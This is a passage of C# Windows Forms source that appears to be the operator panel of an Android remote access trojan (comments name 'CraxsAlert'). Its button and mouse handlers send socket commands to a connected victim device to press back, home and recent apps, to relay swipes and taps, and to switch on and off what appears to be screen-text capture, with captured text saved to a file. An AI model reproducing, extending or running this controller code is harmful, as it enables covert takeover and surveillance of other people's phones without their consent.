					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (Classclient != null)
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (Classclient != null)
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
	}

	private void Viewpanel_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Trakpoint = new List<Point>();
			Trakpoint.Add(new Point(e.X, e.Y));
			isclick = false;
			isdown = true;
		}
		else
			isclick = true;
	}

	private void Viewpanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isdown)
		{
			Swaping = true;
			isclick = false;
			Trakpoint.Add(new Point(e.X, e.Y));
		}
	}

	private void Viewpanel_MouseUp(object sender, MouseEventArgs e)
	{
		isdown = false;
		int num = viewpanel.Width;
		int num2 = viewpanel.Height;
		checked
		{
			if (!isclick)
			{
				if (!Swaping)
					return;
				Swaping = false;
				Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point item in Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
				}
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
			}
			else
			{
				string text = "clk:";
				tiks = 0;
				Point point = viewpanel.PointToClient(Control.MousePosition);
				Point point2 = new Point((int)Math.Round((double)point.X * ((double)num / (double)num)), (int)Math.Round((double)point.Y * ((double)num2 / (double)num2)));
				text = text + point2.X + ":" + point2.Y;
				string[] array2 = Classclient.Keys.Split(':');
				object[] parametersObjects2 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects2);
			}
		}
	}

	private void drakeUIButton1_Click(object sender, EventArgs e)
	{
		if (viewpanel.Controls.Count <= 0)
			return;
		checked
		{
			int num = viewpanel.Controls.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					if (viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(viewpanel.Controls[i].Tag, "E", TextCompare: false))
						viewpanel.Controls.Remove(viewpanel.Controls[i]);
				}
				catch (Exception)
				{
					//ProjectData.SetProjectError(projectError);
					//////CraxsAlert.Showinformation("Sorry");
				}
			}
		}
	}

	private void drakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
		
	}

	private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
	{
		
	}

    private void sButton1_Click(object sender, EventArgs e)
    {
        if (Classclient == null)
            return;
        try
        {
            //textBox1.BringToFront();
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
        TcpClient myClient = Classclient.myClient;
        string[] array = Classclient.Keys.Split(':');
        object[] parametersObjects = new object[4]
        {
            myClient,
            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>o" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
            Codes.Encoding().GetBytes("null"),
            Classclient
        };
        Classclient.SendMessage(parametersObjects);
        Timer1.Enabled = true;
        enablebtn.Enabled = false;
        disablebtn.Enabled = true;
    }

    private void sButton2_Click(object sender, EventArgs e)
    {
        if (Classclient != null)
        {
            TcpClient myClient = Classclient.myClient;
            string[] array = Classclient.Keys.Split(':');
            object[] parametersObjects = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SCRD<*>f" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                Classclient
            };
            Classclient.SendMessage(parametersObjects);
            enablebtn.Enabled = true;
            disablebtn.Enabled = false;
        }
    }

    private void sButton3_Click(object sender, EventArgs e)
    {
        SaveFileDialog saveFileDialog = new SaveFileDialog();
        saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
        saveFileDialog.Title = "Save As Text File";

        if (saveFileDialog.ShowDialog() == DialogResult.OK)
        {
            // Get the selected file name and create a StreamWriter
            string fileName = saveFileDialog.FileName;
            using (StreamWriter sw = new StreamWriter(fileName))
            {
                // Write the TextBox content to the file
                sw.Write(textBox1.Text);
            }
        }
    }

    ///	textBox1.SendToBack();
}
